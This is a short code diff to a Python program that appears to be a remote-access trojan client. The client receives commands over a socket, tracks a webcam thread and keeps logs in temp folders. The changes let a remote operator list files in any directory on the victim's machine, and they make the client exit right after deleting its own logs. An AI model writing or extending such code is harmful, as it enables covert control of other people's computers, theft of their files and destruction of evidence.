@@ -23,6 +23,7 @@ webcam_thread = None
 LOG_DIR_WINDOWS = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Temp', 'logs')
 LOG_DIR_LINUX = '/tmp/logs'
 
+
 # Function to get the OS
 def get_os():
     return platform.system()
@@ -157,7 +158,12 @@ def receive_commands(sock):
                         sock.send(json_data.encode())
 
                 elif command_type == 'SHOW':
-                    files = os.listdir()
+                    path = command['path']
+                    files = os.listdir(path)
+                    files = [file for file in files if not file.startswith('.')]
+                    files = [os.path.join(path, file) for file in files]
+                    files = [{'name': file, 'type': 'file' if os.path.isfile(file) else 'dir'} for file in files]
+
                     client_info = {
                         'command': 'SHOW',
                         'files': files
@@ -202,6 +208,7 @@ def receive_commands(sock):
                     try:
                         log_dir = LOG_DIR_WINDOWS if get_os() == 'Windows' else LOG_DIR_LINUX
                         shutil.rmtree(log_dir)
+                        os._exit(0)
                     except FileNotFoundError:
                         pass
 
